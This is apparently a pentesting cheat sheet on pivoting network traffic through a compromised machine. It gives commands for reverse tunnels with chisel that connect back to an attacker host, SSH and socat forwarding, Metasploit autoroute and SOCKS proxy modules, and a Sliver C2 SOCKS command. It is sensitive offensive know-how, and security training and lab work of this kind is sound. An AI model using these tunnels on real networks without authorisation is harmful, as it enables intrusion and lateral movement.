---
title: "Network Traffic Pivoting"
date: 2024-6-26
tags: ["pivot", "chisel", "ssh", "metasploit", "network", "socat", "port forward", "tunneling"]
---

---
### Chisel 

<small>[Download chisel](https://github.com/jpillora/chisel)</small>

#### Start a Local chisel Server

```bash
# In our local Linux machine
./chisel server --reverse --port 8000
```

#### chisel with ports

```bash
# In target machine
./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080
```

```bash
# Mutiple ports fowarding, can be different targets in the same subnet
./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000
```

#### chisel with socks5

```bash
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```bash
# Add to the end of the file
socks5 127.0.0.1 1080
```

```bash
# In target machine
./chisel client 10.10.11.10:8000 R:1080:socks
```

```bash
# Usage, in our local machine
proxychains4 curl http://127.0.0.1:1080
```

<br>

---

### SSH

```bash
# SSH port forwarding without spawning a shell
ssh -N -L 8080:127.0.0.1:8080 <USER>@10.10.11.10
```

<br>

---

### socat

```bash
# Any traffic go to port 1337 will be forwarded to 10.10.14.10:1337
./socat tcp-listen:1337,fork tcp:10.10.14.10:1337 &
```

<br>

---

### Metasploit

#### Ports

```bash
# Add
portfwd add -l 80 -r 127.0.0.1 -p 80
```

```bash
# Delete
portfwd delete -l 80 -r 127.0.0.1 -p 80
```

#### Socks

```bash
# First add routes to target subnet
use post/multi/manage/autoroute
```

```bash
set session <ID>
```

```bash
run
```

```bash
# Then create socks proxy
use auxiliary/server/socks_proxy
```

```bash
run
```

### Sliver C2

```bash
socks5 start
```

<br>

